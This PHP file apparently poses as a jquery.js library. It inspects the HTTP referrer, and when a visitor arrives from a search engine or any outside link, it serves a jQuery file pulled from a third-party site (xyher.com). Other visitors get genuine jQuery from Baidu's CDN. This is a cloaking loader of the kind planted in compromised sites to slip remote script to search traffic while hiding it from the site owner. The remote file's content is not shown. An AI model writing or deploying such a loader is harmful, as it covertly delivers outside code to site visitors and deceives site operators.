<?php
//header('Content-Type: application/x-javascript; charset=utf-8');
//header('Content-type: text/javascript');
$thisSite = 'http://www.xyher.com/';
//$thisSite = 'http://frame.5zyx.com/ad/';

$reffer = empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'];
$reffer = strtolower($reffer);
//$uri=$_SERVER["REQUEST_URI"];
//if(strpos($uri, "jquery.js") !==false)
//{
    if(isSpider() || strpos($reffer, 'http://') !== false) {
        //header("Location: http://www.xyher.com/jquery-1.8.2.min.js");
        echo file_get_contents($thisSite.'jquery-1.8.2.min.js');
        exit;
    } else {
        //echo 'hello world!';
        //header("Location: http://libs.baidu.com/jquery/1.9.0/jquery.js");
        echo file_get_contents('http://libs.baidu.com/jquery/1.9.0/jquery.js');
        exit;
    }
//} else{
    //echo 'ok';
//}


function isSpider()
{
    $reffer = $_SERVER['HTTP_REFERER'];
    if(!$reffer) {
        return false;
    }
    $agent= strtolower($reffer);  
    if (!empty($agent)) {                 
            $spiderSite= array(
                    "TencentTraveler",
                    "Baiduspider+",
                    "BaiduGame",
                    "Googlebot",
                    "msnbot",
                    "Sosospider+",
                    "Sogou web spider",
                    "ia_archiver",
                    "Yahoo! Slurp",
                    "YoudaoBot",
                    "Yahoo Slurp",
                    "MSNBot",
                    "Java (Often spam bot)",
                    "BaiDuSpider",
                    "Voila",
                    "Yandex bot",
                    "BSpider",
                    "twiceler",
                    "Sogou Spider",
                    "Speedy Spider",
                    "Google AdSense",
                    "Heritrix",
                    "Python-urllib",
                    "Alexa (IA Archiver)",
                    "Ask",
                    "Exabot",
                    "Custo",
                    "OutfoxBot/YodaoBot",
                    "yacy",
                    "SurveyBot",
                    "legs",
                    "lwp-trivial",
                    "Nutch",
                    "StackRambler",
                    "The web archive (IA Archiver)",
                    "Perl tool",
                    "MJ12bot",
                    "Netcraft",
                    "MSIECrawler",
                    "WGet tools",
                    "larbin",
                    "Fish search",
                    "360Spider",
'google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.',
            );   
            foreach($spiderSite as $val) {                        
                    $str = strtolower($val);
                    if (strpos($agent, $str) !== false) {
                            return true;
                    }                        
            }   
    } else {
            return false;
    } 
}
